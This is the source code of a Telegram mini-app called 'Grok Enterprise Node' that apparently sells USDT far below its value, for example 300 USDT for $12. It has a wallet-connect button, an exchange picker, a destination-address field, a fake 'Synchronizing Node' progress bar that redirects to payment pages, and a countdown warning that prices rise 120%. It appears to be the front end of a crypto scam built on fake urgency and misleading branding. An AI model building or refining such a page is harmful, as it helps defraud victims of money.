import React, { useState, useEffect } from 'react';
import { ConnectKitButton } from "connectkit";

/**
 * Grok Enterprise Node - React Version (TSX)
 * تم إضافة ConnectKitButton مع الحفاظ على كافة العناصر والمنطق السابق.
 */

const App = () => {
  // State Management
  const [user, setUser] = useState({ id: '000000000', first_name: 'SYNCING...', photo_url: null });
  const [countdown, setCountdown] = useState({ days: '00', hours: '00', minutes: '00', seconds: '00', expired: false });
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [progress, setProgress] = useState(0);
  
  // Form State
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const [selectedPlatform, setSelectedPlatform] = useState(null);
  const [addressValue, setAddressValue] = useState('');
  const [selectedNetwork, setSelectedNetwork] = useState('');
  const [selectedAmount, setSelectedAmount] = useState(null);

  // Platform Data
  const platforms = [
    { n: 'Binance', i: 'binance.png' }, { n: 'Bybit', i: 'bybit.png' },
    { n: 'Mexc', i: 'mexc.png' }, { n: '1xbet', i: '1xbet.png' },
    { n: 'Linebet', i: 'linebet.png' }, { n: 'Melbet', i: 'malbet.png' },
    { n: 'Megapari', i: 'megapari.png' }, { n: 'Trust Wallet', i: 'trustwallet.png' },
    { n: 'MetaMask', i: 'metamask.png' }, { n: 'Pocket Option', i: 'pocket.png' },
    { n: 'TronLink', i: 'tronlink.png' }, { n: 'XM', i: 'xm.png' },
    { n: 'Tickmill', i: 'tickmall.png' }, { n: 'Exness', i: 'exness.png' },
    { n: 'Quotex', i: 'quotex.png' }, { n: 'eToro', i: 'etoro.png' }
  ];

  // Initialize Telegram WebApp
  useEffect(() => {
    const tg = window.Telegram?.WebApp;
    if (tg) {
      tg.ready();
      tg.expand();
      if (tg.initDataUnsafe?.user) {
        const u = tg.initDataUnsafe.user;
        setUser({
          id: u.id,
          first_name: (u.first_name + ' ' + (u.last_name || '')).toUpperCase(),
          photo_url: u.photo_url
        });
      }
    }
  }, []);

  // Countdown Logic
  useEffect(() => {
    const targetDate = new Date("February 07, 2026 00:00:00").getTime();
    
    const timer = setInterval(() => {
      const now = new Date().getTime();
      const gap = targetDate - now;

      if (gap <= 0) {
        setCountdown(prev => ({ ...prev, expired: true }));
        clearInterval(timer);
        return;
      }

      const second = 1000, minute = second * 60, hour = minute * 60, day = hour * 24;
      setCountdown({
        days: Math.floor(gap / day).toString().padStart(2, '0'),
        hours: Math.floor((gap % day) / hour).toString().padStart(2, '0'),
        minutes: Math.floor((gap % hour) / minute).toString().padStart(2, '0'),
        seconds: Math.floor((gap % minute) / second).toString().padStart(2, '0'),
        expired: false
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // Address Input Handlers
  const handleAddressChange = (e) => {
    const val = e.target.value;
    setAddressValue(val);
    
    if (val.startsWith('T') && val.length >= 30) setSelectedNetwork('TRC20');
    else if (val.startsWith('0x') && val.length >= 40) setSelectedNetwork('BEP20');
    else if ((val.startsWith('U') || val.startsWith('E')) && val.length >= 40) setSelectedNetwork('TON');
    else setSelectedNetwork('');
  };

  // Authorization Process
  const handleAuthorize = () => {
    setIsLoading(true);
    let p = 0;
    const interval = setInterval(() => {
      p += 2;
      setProgress(p);
      if (p >= 100) {
        clearInterval(interval);
        if (selectedAmount === 300) window.location.href = "12.html";
        else if (selectedAmount === 1500) window.location.href = "60.html";
        else if (selectedAmount === 3000) window.location.href = "100.html";
      }
    }, 30);
  };

  const isFormValid = selectedPlatform && addressValue && selectedNetwork && selectedAmount;

  return (
    <div className="fixed inset-0 flex items-center justify-center bg-black overflow-hidden font-['Plus_Jakarta_Sans'] select-none">
      {/* Dynamic Background */}
      <div 
        className="absolute inset-0 z-0" 
        style={{ 
          backgroundImage: 'radial-gradient(circle at center, #111 0%, #000 100%)',
          backgroundSize: 'cover' 
        }} 
      />
      <div className="absolute inset-0 bg-black/40 z-[1]" />

      {/* Loading Overlay */}
      {isLoading && (
        <div className="fixed inset-0 z-[200] bg-black flex flex-col items-center justify-center">
          <svg className="text-white animate-pulse mb-4" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/>
          </svg>
          <div className="text-white text-[10px] font-bold tracking-[0.3em] uppercase mb-6 text-center px-4">Synchronizing Node...</div>
          <div className="w-40 h-[2px] bg-white/10 rounded-full overflow-hidden">
            <div 
              className="h-full bg-white transition-all duration-300" 
              style={{ width: `${progress}%` }}
            />
          </div>
        </div>
      )}

      {/* Prices Modal */}
      {isModalOpen && (
        <div 
          className="fixed inset-0 z-[150] flex items-center justify-center p-6 backdrop-blur-md bg-black/80"
          onClick={() => setIsModalOpen(false)}
        >
          <div 
            className="bg-zinc-900 border border-white/10 w-full max-w-[300px] rounded-[30px] p-5 shadow-2xl animate-in fade-in zoom-in duration-200"
            onClick={e => e.stopPropagation()}
          >
            <div className="text-center mb-5">
              <div className="w-10 h-10 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-2">
                <svg className="text-red-500" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/>
                </svg>
              </div>
              <h3 className="text-white text-base font-black uppercase tracking-widest">New Price List</h3>
              <p className="text-white/40 text-[9px] font-bold uppercase mt-1">Effective after countdown ends</p>
            </div>
            <div className="space-y-2.5 mb-5">
              {[ {u: '300 USDT', p: '69$'}, {u: '1500 USDT', p: '345$'}, {u: '3000 USDT', p: '690$'} ].map((item, idx) => (
                <div key={idx} className="flex items-center justify-between bg-white/5 p-3 rounded-xl border border-white/5">
                  <span className="text-white/60 text-[10px] font-bold uppercase">{item.u}</span>
                  <span className="text-red-500 font-black text-base">{item.p}</span>
                </div>
              ))}
            </div>
            <button 
              onClick={() => setIsModalOpen(false)}
              className="w-full py-3.5 bg-white text-black rounded-xl font-black text-[10px] uppercase tracking-widest active:scale-95 transition-all"
            >
              Understood
            </button>
          </div>
        </div>
      )}

      {/* Floating Support Button */}
      <a 
        href="https://t.me/ZhangHaoyu1921" 
        target="_blank" 
        rel="noopener noreferrer"
        className="fixed bottom-4 right-4 z-[60] group"
      >
        <div className="flex items-center gap-2 bg-black border border-white/20 p-1.5 pr-3 rounded-full shadow-2xl transition-all duration-300 hover:scale-105 active:scale-95 animate-[pulse-border_2s_infinite]">
          <div className="w-8 h-8 bg-white/10 rounded-full flex items-center justify-center group-hover:bg-blue-500 transition-colors">
            <svg className="text-white" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 1 1-7.6-11.7 8.5 8.5 0 0 1 7.6 4.5"></path>
              <path d="M21 12l-5-1 5-1"></path>
              <path d="M18 12h3"></path>
            </svg>
          </div>
          <div className="flex flex-col">
            <span className="text-[7px] font-black text-white/40 uppercase tracking-tighter">Enterprise</span>
            <span className="text-[9px] font-black text-white uppercase tracking-wider">Support</span>
          </div>
        </div>
      </a>

      {/* Main Content Area */}
      <div className="w-full max-w-[420px] h-full flex flex-col relative z-10 px-6 pt-6">
        
        <header className="flex flex-col items-center mb-4">
          <div className="w-14 h-14 rounded-[18px] p-[2px] bg-gradient-to-br from-zinc-600 to-black border border-white/20 mb-2 shadow-xl overflow-hidden">
            <img 
              src={user.photo_url || `https://ui-avatars.com/api/?name=Node&background=000&color=fff`} 
              className="w-full h-full rounded-[16px] object-cover" 
              alt="Profile" 
            />
          </div>
          <h2 className="text-white text-[10px] font-black tracking-[0.1em] uppercase">{user.first_name}</h2>
          <div className="mt-1 px-2.5 py-0.5 bg-black/40 border border-white/10 backdrop-blur-md rounded-full mb-2">
            <span className="text-white/70 font-mono text-[8px] tracking-widest uppercase">UID: {user.id}</span>
          </div>
          
          {/* New ConnectKit Button Integrated */}
          <div className="flex flex-col items-center gap-2">
            <p className="text-white/30 text-[8px] uppercase font-bold tracking-widest">Web3 Node Access</p>
            <ConnectKitButton />
          </div>
        </header>

        {/* Countdown Banner */}
        <div className="mb-4 w-full bg-white/5 border border-white/10 rounded-2xl p-3 backdrop-blur-md">
          <div className="flex flex-col items-center gap-1.5">
            {countdown.expired ? (
               <span className='text-red-500 text-[8px] font-black uppercase tracking-widest'>Offer Expired</span>
            ) : (
              <div className="flex gap-3">
                {[ 
                  {label: 'Days', val: countdown.days}, 
                  {label: 'Hours', val: countdown.hours}, 
                  {label: 'Min', val: countdown.minutes}, 
                  {label: 'Sec', val: countdown.seconds} 
                ].map((t, i) => (
                  <React.Fragment key={i}>
                    <div className="flex flex-col items-center">
                      <span className="text-white text-lg font-black leading-none [text-shadow:0_0_8px_rgba(255,255,255,0.3)]">{t.val}</span>
                      <span className="text-[6px] text-white/40 uppercase font-bold mt-0.5 tracking-widest">{t.label}</span>
                    </div>
                    {i < 3 && <span className="text-white/20 font-black text-lg">:</span>}
                  </React.Fragment>
                ))}
              </div>
            )}
            <div className="w-full h-[1px] bg-white/5 my-0.5" />
            <p className="text-[8px] text-center font-bold text-white/70 tracking-tight leading-tight px-2">
              Prices will increase by <span className="text-red-500 font-black">120%</span>.
            </p>
            <button 
              onClick={() => setIsModalOpen(true)}
              className="mt-1 px-4 py-1.5 bg-red-600 rounded-full text-[8px] font-black text-white uppercase tracking-[0.2em] animate-[pulse-red_2s_infinite] active:scale-90 transition-all"
            >
              Check Now
            </button>
          </div>
        </div>

        {/* Form Container */}
        <div className="bg-white/95 backdrop-blur-[15px] rounded-t-[35px] shadow-2xl flex-1 p-4 pb-4 space-y-3.5 border-x border-t border-black/5 flex flex-col justify-between mb-0 overflow-hidden">
          
          <div className="space-y-3">
            {/* Platform Dropdown */}
            <div className="relative">
              <label className="text-[8px] font-black text-zinc-400 uppercase tracking-wider ml-1 mb-1 block">Enterprise Source</label>
              <button 
                onClick={() => setIsDropdownOpen(!isDropdownOpen)}
                className="w-full bg-zinc-50 border border-zinc-100 rounded-xl p-3 flex items-center justify-between transition-all active:bg-zinc-100"
              >
                <div className="flex items-center gap-2">
                  {selectedPlatform ? (
                    <>
                      <img 
                        src={selectedPlatform.i} 
                        className="w-3.5 h-3.5 object-contain" 
                        onError={(e) => e.target.src = 'https://cdn-icons-png.flaticon.com/512/2091/2091665.png'}
                      />
                      <span className="text-[10px] font-bold text-black uppercase">{selectedPlatform.n}</span>
                    </>
                  ) : (
                    <span className="text-[10px] font-bold text-zinc-300 uppercase">Select Access Point</span>
                  )}
                </div>
                <svg className={`text-zinc-400 transition-transform ${isDropdownOpen ? 'rotate-180' : ''}`} width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="6 9 12 15 18 9" />
                </svg>
              </button>
              
              {isDropdownOpen && (
                <div className="absolute top-full left-0 right-0 mt-1 bg-white border border-zinc-200 rounded-xl shadow-2xl z-50 max-h-[160px] overflow-y-auto no-scrollbar grid grid-cols-1 gap-1 p-2 animate-[slideDown_0.2s_ease-out]">
                  {platforms.map((p, idx) => (
                    <div 
                      key={idx}
                      onClick={() => { setSelectedPlatform(p); setIsDropdownOpen(false); }}
                      className="flex items-center gap-2 p-2 hover:bg-zinc-50 rounded-lg cursor-pointer transition-colors border border-transparent active:bg-zinc-100"
                    >
                      <img 
                        src={p.i} 
                        className="w-5 h-5 object-contain" 
                        onError={(e) => e.target.src = 'https://cdn-icons-png.flaticon.com/512/2091/2091665.png'}
                      />
                      <span className="text-[9px] font-bold text-zinc-700">{p.n}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Address Input */}
            <div>
              <label className="text-[8px] font-black text-zinc-400 uppercase tracking-wider ml-1 mb-1 block">Destination Hash</label>
              <input 
                type="text" 
                value={addressValue}
                onChange={handleAddressChange}
                placeholder="Target Address..." 
                className="w-full bg-zinc-50 border border-zinc-100 rounded-xl p-3 text-[10px] font-bold text-black outline-none focus:bg-white transition-all placeholder:text-zinc-200"
              />
            </div>

            {/* Protocols */}
            <div>
              <label className="text-[8px] font-black text-zinc-400 uppercase tracking-wider ml-1 mb-1 block">Detected Protocol</label>
              <div className="grid grid-cols-3 gap-2">
                {[
                  {id: 'TRC20', img: 'https://cryptologos.cc/logos/tron-trx-logo.png'},
                  {id: 'BEP20', img: 'https://cryptologos.cc/logos/bnb-bnb-logo.png'},
                  {id: 'TON', img: 'https://cryptologos.cc/logos/toncoin-ton-logo.png'}
                ].map(net => (
                  <div 
                    key={net.id}
                    onClick={() => setSelectedNetwork(net.id)}
                    className={`py-2 rounded-xl text-[8px] text-center font-black transition-all border flex flex-col items-center justify-center gap-1 cursor-pointer 
                      ${selectedNetwork === net.id ? 'bg-black border-black text-white shadow-md opacity-100' : 'bg-zinc-50 border-zinc-100 text-zinc-300 opacity-60'}`}
                  >
                    <img src={net.img} className="w-5 h-5" alt={net.id} /> {net.id}
                  </div>
                ))}
              </div>
            </div>

            {/* Amounts */}
            <div className="flex-1 overflow-y-auto no-scrollbar">
              <label className="text-[8px] font-black text-zinc-400 uppercase tracking-wider ml-1 mb-1 block">Resource Volume</label>
              <div className="flex flex-col gap-1.5">
                {[
                  {amt: 300, cost: '12$'},
                  {amt: 1500, cost: '60$'},
                  {amt: 3000, cost: '100$'}
                ].map(item => (
                  <button 
                    key={item.amt}
                    onClick={() => setSelectedAmount(item.amt)}
                    className={`px-3.5 py-2.5 rounded-xl flex items-center justify-between transition-all border 
                      ${selectedAmount === item.amt ? 'bg-black border-black text-white' : 'bg-zinc-50 border-zinc-100 text-zinc-400'}`}
                  >
                    <div className="text-left">
                      <div className="text-[10px] font-black text-inherit">{item.amt} USDT</div>
                      <div className="text-[6px] font-bold opacity-40 uppercase">Global Sync</div>
                    </div>
                    <div className={`text-[9px] font-black px-2 py-0.5 rounded-lg ${selectedAmount === item.amt ? 'bg-white text-black' : 'bg-zinc-100 text-zinc-500'}`}>
                      {item.cost}
                    </div>
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Footer Action */}
          <div className="pt-1">
            <button 
              disabled={!isFormValid}
              onClick={handleAuthorize}
              className={`w-full py-3.5 rounded-xl font-black text-[10px] uppercase tracking-[0.2em] transition-all flex items-center justify-center gap-2 
                ${isFormValid ? 'bg-black text-white shadow-xl active:scale-95 cursor-pointer' : 'bg-zinc-100 text-zinc-300 cursor-not-allowed'}`}
            >
              Authorize 
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
              </svg>
            </button>
            <div className="text-center mt-2 opacity-20 flex flex-col items-center gap-0.5">
              <div className="flex items-center gap-1.5 text-black font-black text-[8px] uppercase tracking-[0.3em]">
                Grok Enterprise
              </div>
            </div>
          </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        @keyframes pulse-border {
          0% { box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.4); }
          70% { box-shadow: 0 0 0 10px rgba(255, 255, 255, 0); }
          100% { box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); }
        }
        @keyframes pulse-red {
          0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); }
          70% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(239, 68, 68, 0); }
          100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
        }
        @keyframes slideDown {
          from { opacity: 0; transform: translateY(-8px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
      `}} />
    </div>
  );
};

export default App;

